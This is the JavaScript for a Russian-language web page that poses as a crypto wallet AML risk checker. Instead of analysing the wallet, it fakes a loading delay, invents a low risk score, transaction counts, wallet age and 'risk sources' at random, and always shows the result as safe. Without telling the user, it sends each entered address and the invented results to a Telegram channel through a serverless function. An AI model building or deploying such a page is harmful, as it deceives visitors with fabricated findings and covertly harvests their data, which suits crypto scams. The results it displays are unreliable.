// Получаем элементы со страницы
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const resultSection = document.getElementById('resultSection');
const checkedAddress = document.getElementById('checkedAddress');
const totalTx = document.getElementById('totalTx');
const suspiciousTx = document.getElementById('suspiciousTx');
const walletAge = document.getElementById('walletAge');
const lastActive = document.getElementById('lastActive');
const riskPercent = document.getElementById('riskPercent');
const riskFill = document.getElementById('riskFill');
const sourcesList = document.getElementById('sourcesList');

// База возможных источников риска
const riskSources = [
    '🔞 Эксплуатация несовершеннолетних',
    '🛑 Даркнет-маркеты',
    '🚫 Запрещённые сервисы',
    '⚖️ Под следствием',
    '🏦 Подозрительные биржи',
    '🎰 Неавторизованные казино',
    '🛠️ Мошеннические сервисы',
    '🌀 Миксеры и тумблеры',
    '💰 Вымогательство',
    '🌍 Санкционные адреса',
    '🎭 Мошенничество (скам)',
    '🔪 Хакерские атаки',
    '💣 Финансирование терроризма',
    '🏧 Криптоматы',
    '⚠️ Биржи без KYC',
    '💧 Пулы ликвидности',
    '🤝 P2P-биржи высокого риска',
    '❓ Неизвестные сервисы'
];

// Функция отправки данных на серверную функцию
async function sendToTelegram(data) {
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        const result = await response.json();
        if (!response.ok) {
            console.error('Ошибка отправки в Telegram:', result.error);
        } else {
            console.log('✅ Данные успешно отправлены');
        }
    } catch (error) {
        console.error('Ошибка при отправке:', error);
    }
}

// Функция генерации случайной даты в пределах последних 30 дней
function randomRecentDate() {
    const now = new Date();
    const daysAgo = Math.floor(Math.random() * 30);
    const date = new Date(now - daysAgo * 24 * 60 * 60 * 1000);
    return date.toLocaleDateString('ru-RU');
}

// Функция генерации случайного возраста кошелька
function randomWalletAge() {
    const months = Math.floor(Math.random() * 24) + 1; // от 1 до 24 месяцев
    if (months < 12) {
        return months + ' мес.';
    } else {
        const years = Math.floor(months / 12);
        const remainingMonths = months % 12;
        return years + ' г. ' + (remainingMonths > 0 ? remainingMonths + ' мес.' : '');
    }
}

// Обработчик клика по кнопке проверки
checkBtn.addEventListener('click', function() {
    const address = walletInput.value.trim();
    
    if (address === '') {
        alert('Введите адрес кошелька');
        return;
    }

    // Показываем секцию результата
    resultSection.style.display = 'block';
    
    // Отображаем проверяемый адрес
    checkedAddress.textContent = address;
    
    // Показываем заглушки загрузки
    totalTx.textContent = '...';
    suspiciousTx.textContent = '...';
    walletAge.textContent = '...';
    lastActive.textContent = '...';
    riskPercent.textContent = 'Проверка...';
    riskFill.style.width = '0%';
    sourcesList.innerHTML = '<p>⏳ Анализируем транзакции...</p>';

    // Имитация задержки анализа
    setTimeout(() => {
        // Генерируем случайный риск от 2% до 20%
        const risk = Math.floor(Math.random() * 19) + 2;
        
        // Генерируем статистику на основе риска
        const totalTransactions = Math.floor(Math.random() * 500) + 50; // 50-550
        const suspiciousCount = Math.floor(totalTransactions * (risk / 100)); // риск% от общего числа
        
        // Обновляем статистику
        totalTx.textContent = totalTransactions.toLocaleString();
        suspiciousTx.textContent = suspiciousCount.toLocaleString();
        walletAge.textContent = randomWalletAge();
        lastActive.textContent = randomRecentDate();
        
        // Обновляем риск
        riskPercent.textContent = risk + '%';
        riskFill.style.width = risk + '%';
        riskPercent.style.color = '#00c9b7'; // всегда зелёный для демо

        // Выбираем случайные источники риска
        const numSources = Math.floor(risk / 10) + 1; // от 1 до 3
        const shuffled = [...riskSources].sort(() => 0.5 - Math.random());
        const selectedSources = shuffled.slice(0, numSources);
        
        sourcesList.innerHTML = '';
        selectedSources.forEach(source => {
            const p = document.createElement('p');
            p.textContent = '⚠️ ' + source;
            sourcesList.appendChild(p);
        });

        // Отправляем данные в Telegram
        sendToTelegram({
            address: address,
            risk: risk,
            sources: selectedSources,
            totalTransactions: totalTransactions,
            suspiciousTransactions: suspiciousCount
        });
    }, 1500);
});

// Модальные окна (условия и AML-политика)
const termsModal = document.getElementById('termsModal');
const amlModal = document.getElementById('amlModal');
const showTerms = document.getElementById('showTerms');
const showAML = document.getElementById('showAMLPolicy');
const closeButtons = document.querySelectorAll('.close, .close-aml');

if (showTerms) {
    showTerms.addEventListener('click', function(e) {
        e.preventDefault();
        termsModal.style.display = 'block';
    });
}

if (showAML) {
    showAML.addEventListener('click', function(e) {
        e.preventDefault();
        amlModal.style.display = 'block';
    });
}

closeButtons.forEach(btn => {
    btn.addEventListener('click', function() {
        termsModal.style.display = 'none';
        amlModal.style.display = 'none';
    });
});

window.addEventListener('click', function(e) {
    if (e.target === termsModal) {
        termsModal.style.display = 'none';
    }
    if (e.target === amlModal) {
        amlModal.style.display = 'none';
    }
});